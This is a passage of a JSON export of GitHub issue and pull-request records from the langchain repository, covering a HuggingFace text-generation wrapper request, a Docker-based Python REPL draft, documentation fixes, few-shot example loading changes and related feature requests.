        "html_url": "https://github.com/langchain-ai/langchain/issues/4433",
        "id": 1703020333,
        "node_id": "I_kwDOIPDwls5lggct",
        "number": 4433,
        "title": "Add LLM wrapper for HuggingFace text-generation local inference server",
        "user": {
            "login": "dcbark01",
            "id": 16838332,
            "node_id": "MDQ6VXNlcjE2ODM4MzMy",
            "avatar_url": "https://avatars.githubusercontent.com/u/16838332?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dcbark01",
            "html_url": "https://github.com/dcbark01",
            "followers_url": "https://api.github.com/users/dcbark01/followers",
            "following_url": "https://api.github.com/users/dcbark01/following{/other_user}",
            "gists_url": "https://api.github.com/users/dcbark01/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dcbark01/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dcbark01/subscriptions",
            "organizations_url": "https://api.github.com/users/dcbark01/orgs",
            "repos_url": "https://api.github.com/users/dcbark01/repos",
            "events_url": "https://api.github.com/users/dcbark01/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dcbark01/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T02:40:16Z",
        "updated_at": "2023-05-13T16:12:28Z",
        "closed_at": "2023-05-13T16:12:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Feature request\r\n\r\nHuggingFace has a nice API for serving local LLMs in their [`text-generation`](https://github.com/huggingface/text-generation-inference) repo. I'd like to have a wrapper for this implemented in `langchain.llms`. \r\n\r\n**Resolves Issues**\r\n\r\n* [Feature Request Issue 4433](https://github.com/hwchase17/langchain/issues/4433)\r\n* [Feature Request Issue 4280](https://github.com/hwchase17/langchain/issues/4280)\r\n\r\nUsage would basically be something like:\r\n\r\n```python\r\n# Both of these examples assume you already have a local LLM server\r\n# running. See the HuggingFace text-generation documentation for more\r\n# information on how to do this.\r\nfrom langchain.llms import HuggingFaceTextgen\r\n\r\nprompt = \"What is Deep Learning?\"\r\nhost = \"localhost\"\r\nport = 8080\r\n\r\n# Basic example (no streaming)\r\nllm = HuggingFaceTextgen(host=host, port=port)\r\nprint(llm(prompt))\r\n\r\n# Streaming response example\r\nfrom langchain.callbacks import streaming_stdout\r\n\r\ncallbacks = [streaming_stdout.StreamingStdOutCallbackHandler()]\r\nllm = HuggingFaceTextgen(\r\n    host=host,\r\n    port=port,\r\n    callbacks=callbacks,\r\n    stream=True\r\n)\r\nprint(llm(prompt))\r\n```\r\n\r\n### Motivation\r\n\r\nThere are a few existing HF LLM wrappers in langchain, but they seem to be more focused towards HF Hub use-cases. One of the biggest things the existing implementations lack (at least so far as I can tell), is they don't support streaming tokens back, which helps reduce _perceived latency_ for the user. \r\n\r\n### Your contribution\r\n\r\n[Pull Request 4434](https://github.com/hwchase17/langchain/pull/4434)\r\n[See also PR 4447](https://github.com/hwchase17/langchain/pull/4447) - coincidentally implemented same feature at the same time - either one of these PRs should close the associated issues",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4432",
        "id": 1702941714,
        "node_id": "PR_kwDOIPDwls5QJEfS",
        "number": 4432,
        "title": "feat: run python repl in a docker container",
        "user": {
            "login": "mbchang",
            "id": 6439365,
            "node_id": "MDQ6VXNlcjY0MzkzNjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6439365?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mbchang",
            "html_url": "https://github.com/mbchang",
            "followers_url": "https://api.github.com/users/mbchang/followers",
            "following_url": "https://api.github.com/users/mbchang/following{/other_user}",
            "gists_url": "https://api.github.com/users/mbchang/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mbchang/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mbchang/subscriptions",
            "organizations_url": "https://api.github.com/users/mbchang/orgs",
            "repos_url": "https://api.github.com/users/mbchang/repos",
            "events_url": "https://api.github.com/users/mbchang/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mbchang/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700863,
                "node_id": "LA_kwDOIPDwls8AAAABUpidvw",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:enhancement",
                "name": "auto:enhancement",
                "color": "C2E0C6",
                "default": false,
                "description": "A large net-new component, integration, or chain. Use sparingly. The largest features"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T00:55:42Z",
        "updated_at": "2023-08-01T00:48:02Z",
        "closed_at": "2023-08-01T00:48:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4432",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4432",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4432.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4432.patch",
            "merged_at": null
        },
        "body": "# Run Python REPL in Docker Container\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes # (issue)\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\nStill a draft. Did not add tests yet. \r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4432/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4431",
        "id": 1702915300,
        "node_id": "PR_kwDOIPDwls5QI-3E",
        "number": 4431,
        "title": "Update contribution guidelines",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T00:26:34Z",
        "updated_at": "2023-05-11T07:05:26Z",
        "closed_at": "2023-05-11T07:05:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4431",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4431",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4431.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4431.patch",
            "merged_at": "2023-05-11T07:05:25Z"
        },
        "body": "provide more guidance on pr's",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4431/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4430",
        "id": 1702912082,
        "node_id": "PR_kwDOIPDwls5QI-NO",
        "number": 4430,
        "title": "docs `retriever` improvements",
        "user": {
            "login": "leo-gan",
            "id": 2256422,
            "node_id": "MDQ6VXNlcjIyNTY0MjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2256422?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/leo-gan",
            "html_url": "https://github.com/leo-gan",
            "followers_url": "https://api.github.com/users/leo-gan/followers",
            "following_url": "https://api.github.com/users/leo-gan/following{/other_user}",
            "gists_url": "https://api.github.com/users/leo-gan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/leo-gan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/leo-gan/subscriptions",
            "organizations_url": "https://api.github.com/users/leo-gan/orgs",
            "repos_url": "https://api.github.com/users/leo-gan/repos",
            "events_url": "https://api.github.com/users/leo-gan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/leo-gan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-10T00:20:51Z",
        "updated_at": "2023-05-17T22:29:22Z",
        "closed_at": "2023-05-17T22:29:22Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4430",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4430",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4430.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4430.patch",
            "merged_at": "2023-05-17T22:29:22Z"
        },
        "body": "# Docs: improvements in the `retrievers/examples/` notebooks\r\n\r\nIts primary purpose is to make the Jupyter notebook examples **consistent** and more suitable for first-time viewers.\r\n- add links to the integration source (if applicable) with a short description of this source;\r\n- removed `_retriever` suffix from the file names (where it existed) for consistency;\r\n- removed ` retriever` from the notebook title (where it existed) for consistency;\r\n- added code to install necessary Python package(s);\r\n- added code to set up the necessary API Key.\r\n- very small fixes in notebooks from other folders (for consistency):\r\n  - docs/modules/indexes/vectorstores/examples/elasticsearch.ipynb\r\n  - docs/modules/indexes/vectorstores/examples/pinecone.ipynb\r\n  - docs/modules/models/llms/integrations/cohere.ipynb\r\n- fixed misspelling in langchain/retrievers/time_weighted_retriever.py comment (sorry, about this change in a .py file )\r\n\r\n## Who can review\r\n@dev2049",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4430/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4429",
        "id": 1702904262,
        "node_id": "I_kwDOIPDwls5lgEHG",
        "number": 4429,
        "title": "Add support for regular expression in CharacterTextSplitter",
        "user": {
            "login": "frequena",
            "id": 10067243,
            "node_id": "MDQ6VXNlcjEwMDY3MjQz",
            "avatar_url": "https://avatars.githubusercontent.com/u/10067243?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/frequena",
            "html_url": "https://github.com/frequena",
            "followers_url": "https://api.github.com/users/frequena/followers",
            "following_url": "https://api.github.com/users/frequena/following{/other_user}",
            "gists_url": "https://api.github.com/users/frequena/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/frequena/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/frequena/subscriptions",
            "organizations_url": "https://api.github.com/users/frequena/orgs",
            "repos_url": "https://api.github.com/users/frequena/repos",
            "events_url": "https://api.github.com/users/frequena/events{/privacy}",
            "received_events_url": "https://api.github.com/users/frequena/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-10T00:08:27Z",
        "updated_at": "2023-09-15T15:48:31Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Feature request\n\nThe current version of CharacterTextSplitter does not provide support for a regular expression in the separator argument.\n\n### Motivation\n\nMany documents can be split by slightly different patterns that can be handled by regular expression\n\n### Your contribution\n\n-",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4429/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4428",
        "id": 1702884968,
        "node_id": "PR_kwDOIPDwls5QI4n0",
        "number": 4428,
        "title": "[test] add a new test for LLM class",
        "user": {
            "login": "skcoirz",
            "id": 62768671,
            "node_id": "MDQ6VXNlcjYyNzY4Njcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/62768671?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skcoirz",
            "html_url": "https://github.com/skcoirz",
            "followers_url": "https://api.github.com/users/skcoirz/followers",
            "following_url": "https://api.github.com/users/skcoirz/following{/other_user}",
            "gists_url": "https://api.github.com/users/skcoirz/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skcoirz/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skcoirz/subscriptions",
            "organizations_url": "https://api.github.com/users/skcoirz/orgs",
            "repos_url": "https://api.github.com/users/skcoirz/repos",
            "events_url": "https://api.github.com/users/skcoirz/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skcoirz/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700883,
                "node_id": "LA_kwDOIPDwls8AAAABUpid0w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:nit",
                "name": "auto:nit",
                "color": "FEF2C0",
                "default": false,
                "description": "Small modifications/deletions, fixes, deps or improvements to existing code or docs"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T23:37:32Z",
        "updated_at": "2023-08-01T00:48:33Z",
        "closed_at": "2023-08-01T00:48:33Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4428",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4428",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4428.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4428.patch",
            "merged_at": null
        },
        "body": "- added unit test cases for LLM base class.\r\n- covering both realtime and async entry points.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4428/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4426",
        "id": 1702866961,
        "node_id": "PR_kwDOIPDwls5QI0_X",
        "number": 4426,
        "title": "Change how few shot examples are loaded",
        "user": {
            "login": "diva-D",
            "id": 28694272,
            "node_id": "MDQ6VXNlcjI4Njk0Mjcy",
            "avatar_url": "https://avatars.githubusercontent.com/u/28694272?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/diva-D",
            "html_url": "https://github.com/diva-D",
            "followers_url": "https://api.github.com/users/diva-D/followers",
            "following_url": "https://api.github.com/users/diva-D/following{/other_user}",
            "gists_url": "https://api.github.com/users/diva-D/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/diva-D/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/diva-D/subscriptions",
            "organizations_url": "https://api.github.com/users/diva-D/orgs",
            "repos_url": "https://api.github.com/users/diva-D/repos",
            "events_url": "https://api.github.com/users/diva-D/events{/privacy}",
            "received_events_url": "https://api.github.com/users/diva-D/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700873,
                "node_id": "LA_kwDOIPDwls8AAAABUpidyQ",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:improvement",
                "name": "auto:improvement",
                "color": "FBCA04",
                "default": false,
                "description": "Medium size change to existing code to handle new use-cases"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T23:08:22Z",
        "updated_at": "2023-08-11T21:40:16Z",
        "closed_at": "2023-08-11T21:40:15Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4426",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4426",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4426.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4426.patch",
            "merged_at": null
        },
        "body": "# Change how few shot examples are loaded\r\n\r\nTo make prompt loading more consistent, I updated how examples are loaded from a file when loading a `FewShotPromptTemplate`.\r\n\r\nWhen loading a template, or example prompt, from a file (as opposed to directly in the PromptTemplate) a `template_path` or `example_prompt_path` field is used to distinguish it from `template` or `example_prompt`.\r\n\r\nHowever, when loading examples, it uses the same `examples` field, whether it is a list of examples or a string of the file path.\r\n\r\n```json\r\n{\r\n    \"_type\": \"few_shot\",\r\n    \"input_variables\": [\"adjective\"],\r\n    \"prefix\": \"Write antonyms for the following words.\",\r\n    \"example_prompt_path\": \"example_prompt.json\",\r\n    \"examples\": \"examples.json\",\r\n    \"suffix\": \"Input: {adjective}\\nOutput:\"\r\n}\r\n```\r\n\r\nThis PR makes it so that to load examples from a file it will use the `examples_path` field instead of just `examples` to match the pattern established by other fields.\r\n\r\n```json\r\n{\r\n    \"_type\": \"few_shot\",\r\n    \"input_variables\": [\"adjective\"],\r\n    \"prefix\": \"Write antonyms for the following words.\",\r\n    \"example_prompt_path\": \"example_prompt.json\",\r\n    \"examples_path\": \"examples.json\",\r\n    \"suffix\": \"Input: {adjective}\\nOutput:\"\r\n}\r\n```\r\n\r\nI have updated the unit tests and relevant docs/notebooks to match the new pattern.\r\n\r\nFirst time contributing so please provide any constructive feedback on the PR!",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4426/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4425",
        "id": 1702855007,
        "node_id": "I_kwDOIPDwls5lf4Ff",
        "number": 4425,
        "title": "I wonder for embedding, we can allow passing other than page_content for embedding service",
        "user": {
            "login": "QingsongYao",
            "id": 697725,
            "node_id": "MDQ6VXNlcjY5NzcyNQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/697725?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/QingsongYao",
            "html_url": "https://github.com/QingsongYao",
            "followers_url": "https://api.github.com/users/QingsongYao/followers",
            "following_url": "https://api.github.com/users/QingsongYao/following{/other_user}",
            "gists_url": "https://api.github.com/users/QingsongYao/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/QingsongYao/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/QingsongYao/subscriptions",
            "organizations_url": "https://api.github.com/users/QingsongYao/orgs",
            "repos_url": "https://api.github.com/users/QingsongYao/repos",
            "events_url": "https://api.github.com/users/QingsongYao/events{/privacy}",
            "received_events_url": "https://api.github.com/users/QingsongYao/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2023-05-09T22:53:11Z",
        "updated_at": "2023-09-15T16:14:18Z",
        "closed_at": "2023-09-15T16:14:18Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Feature request\n\nI like to add more metadata, such as keywords, highlights, questions to be answered together when building an embedding for a document, other than only page_content,  I wonder how can it be achieved today? \n\n### Motivation\n\nallow to annotate source document to better embedding. but without changing the document.\n\n### Your contribution\n\nn/a",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4425/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4424",
        "id": 1702854988,
        "node_id": "PR_kwDOIPDwls5QIybi",
        "number": 4424,
        "title": "Dev2049/pinecone try except",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T22:53:10Z",
        "updated_at": "2023-05-09T23:03:20Z",
        "closed_at": "2023-05-09T23:03:19Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4424",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4424",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4424.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4424.patch",
            "merged_at": "2023-05-09T23:03:19Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4424/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4423/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4423",
        "id": 1702839837,
        "node_id": "I_kwDOIPDwls5lf0Yd",
        "number": 4423,
        "title": "Do Q/A with csv agent and multiple txt files at the same time.",
        "user": {
            "login": "tianshubao1",
            "id": 12554103,
            "node_id": "MDQ6VXNlcjEyNTU0MTAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/12554103?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tianshubao1",
            "html_url": "https://github.com/tianshubao1",
            "followers_url": "https://api.github.com/users/tianshubao1/followers",
            "following_url": "https://api.github.com/users/tianshubao1/following{/other_user}",
            "gists_url": "https://api.github.com/users/tianshubao1/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tianshubao1/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tianshubao1/subscriptions",
            "organizations_url": "https://api.github.com/users/tianshubao1/orgs",
            "repos_url": "https://api.github.com/users/tianshubao1/repos",
            "events_url": "https://api.github.com/users/tianshubao1/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tianshubao1/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2023-05-09T22:33:44Z",
        "updated_at": "2023-05-26T17:54:10Z",
        "closed_at": "2023-05-25T21:23:12Z",
        "author_association": "NONE",
        "active_lock_reason": null,
